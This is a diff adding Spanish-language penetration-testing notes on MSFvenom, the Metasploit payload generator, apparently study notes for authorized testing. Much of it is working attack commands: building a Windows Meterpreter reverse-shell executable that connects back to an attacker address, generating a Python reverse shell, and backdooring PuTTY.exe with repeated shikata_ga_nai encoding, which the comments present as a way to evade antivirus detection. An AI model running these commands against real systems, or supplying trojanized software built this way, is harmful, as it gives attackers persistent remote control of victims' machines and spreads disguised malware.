@@ -1,0 +1,26 @@
+#MSFvenom es una herramienta incluida en el framework Metasploit diseñada para la generación de cargas útiles (payloads) 
+#personalizadas utilizadas en pruebas de penetración y actividades de post-explotación. Combina las funcionalidades de 
+#"msfpayload" y "msfencode" en una única herramienta potente.
+
+#En el contexto de la post-explotación, MSFvenom permite:
+#- Crear payloads que se ejecutan en sistemas comprometidos para obtener acceso persistente.
+#- Generar binarios maliciosos o scripts que interactúan con el framework Metasploit.
+#- Codificar payloads para evitar detección por sistemas antivirus (AV evasion).
+#- Personalizar parámetros como el puerto, IP de retorno (LHOST), y más.
+
+#Es especialmente útil para escenarios donde se requiere interactuar con el sistema víctima después de haber explotado 
+#una vulnerabilidad, manteniendo control remoto y ejecutando comandos adicionales.
+
+#Ejemplo básico de uso:
+
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.11.20 LPORT=7777 -f exe -o payload.exe
+
+#En este ejemplo, se genera un archivo ejecutable que establece una conexión inversa al atacante usando Meterpreter.
+
+#Generar un payload en terminal para pasarlo a la maquina victima:
+
+$ msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT>
+
+#Utilizar "msfvenom" para incrustar el codigo de la "backdoor" dentro de la aplicacion "PuTTY.exe" por ejemplo:
+
+$ msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
